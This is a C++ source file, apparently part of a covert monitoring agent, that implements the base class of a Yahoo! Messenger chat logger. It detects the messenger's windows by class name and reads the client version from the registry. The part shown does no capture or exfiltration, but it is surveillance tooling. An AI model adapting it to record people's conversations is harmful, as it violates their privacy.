/*
* Yahoo! Messenger Logger, base class
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <string>
#include <vector>
#include <exception>
using namespace std;

#include "QYim.h"
#include "QAgent.h"
#include "..\common.h"
QYim::QYim()
{
	hwMain = hwChat = hwUserList = hwLogin = hwContacts = hwHistory = NULL;
}

/**
* Torna TRUE se la finestra identificata dall'hwnd contenuto in QProperty appartiene a Yahoo! Messenger
*/
BOOL QYim::Is(HWND hw)
{
	UINT i = 1, uVer = 0;
	WCHAR wClassName[256] = {0};
	WCHAR wTitle[256] = {0};
	HWND hTmp;

	// YMsg < 10.0
	PWCHAR pwClass[] = {
		L"YSearchMenuWndClass",
		L"IMClass",
		L"YHTMLContainer",
		L"Internet Explorer_Server",
		0
	};

	// YMgs == 10.0
	PWCHAR pwClass10[] = {
		L"CConvWndBase",
		L"YHTMLContainer",
		L"Internet Explorer_Server",
		0
	};

	hTmp = hw;

	if (FNC(GetClassNameW)(hw, wClassName, 256) == 0)
		return FALSE;

	// YMsg < 10.0
	if (!wcsncmp(wClassName, pwClass[0], wcslen(wClassName))) {
		uVer = 9;
	}

	// YMsg == 10.0
	if (uVer == 0 && !wcsncmp(wClassName, pwClass10[0], wcslen(wClassName))) {
		uVer = 10;
	}

	// Non siamo riusciti ad identificare la versione
	if (uVer == 0)
		return FALSE;

	// Scorriamo l'albero (YIM 9 o precedenti)
	i = 1;

	if (uVer == 9) {
		while (pwClass[i] != 0) {
			hTmp = FNC(FindWindowExW)(hTmp, NULL, pwClass[i], NULL);

			if (hTmp == NULL)
				return FALSE;

			i++;
		}
	}

	// YIM 10
	i = 1;

	if (uVer == 10) {
		while (pwClass10[i] != 0) {
			hTmp = FNC(FindWindowExW)(hTmp, NULL, pwClass10[i], NULL);

			if (hTmp == NULL)
				return FALSE;

			i++;
		}
	}

	return TRUE;
}

UINT QYim::Version(const HWND hw)
{
	UINT uVersion;
	BYTE bVersion;

	uVersion = VersionEx(NULL);
	bVersion = (BYTE)((uVersion & 0xff000000) >> 24);

	switch(bVersion) {
		case 0x0A:
			return YIM_10;

		case 0x09:
		case 0x08:
			return YIM_8;

		case 0x07:
			return YIM_7;

		default:
			return UNKNOWN_VERSION;
	}

	return UNKNOWN_VERSION;
}

// Yim: HKEY_CURRENT_USER\Software\Yahoo\pager\Version
// La versione di Yim e' storata in questo modo: x.x.x.xxx, a noi interessano
// solo la major e minor version che vengono messe in un UINT (bit piu' significativo
// == major), per il momento i 16 bit inferiori dell'UINT ritornato sono settati a
// 0. Quindi la versione 8.1.0.421 sara' identificata come: 0x08010000
UINT QYim::VersionEx(const HWND hw)
{
	HKEY hKey;
	WCHAR wVersion[20] = {0}, wTmp[20] = {0};
	PWCHAR pwVer;
	DWORD dSize = sizeof(wVersion);
	UINT uVersion = 0, uLen, uTmp;

	if(FNC(RegOpenKeyExW)(HKEY_CURRENT_USER, L"Software\\Yahoo\\pager", NULL, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
		return UNKNOWN_VERSION;

	if(FNC(RegQueryValueExW)(hKey, L"Version", NULL, NULL, (LPBYTE)&wVersion, &dSize) != ERROR_SUCCESS){
		FNC(RegCloseKey)(hKey);
		return UNKNOWN_VERSION;
	}

	FNC(RegCloseKey)(hKey);

	pwVer = wcschr(wVersion, '.');

	if(pwVer == NULL)
		return UNKNOWN_VERSION;

	uLen = pwVer - wVersion;
	memcpy(wTmp, wVersion, uLen * sizeof(WCHAR));
	uTmp = _wtoi(wTmp);
	uVersion = uTmp << 24;

	pwVer++;
	pwVer = wcschr(pwVer, '.');

	if(pwVer == NULL)
		return uVersion;

	uLen = pwVer - wVersion - uLen - 1;
	memcpy(wTmp, pwVer - uLen, uLen * sizeof(WCHAR));
	uTmp = _wtoi(wTmp);
	uVersion |= (uTmp << 16);

	return uVersion;
}

const PWCHAR QYim::GetMessenger()
{ 
	return L"Yim"; 
}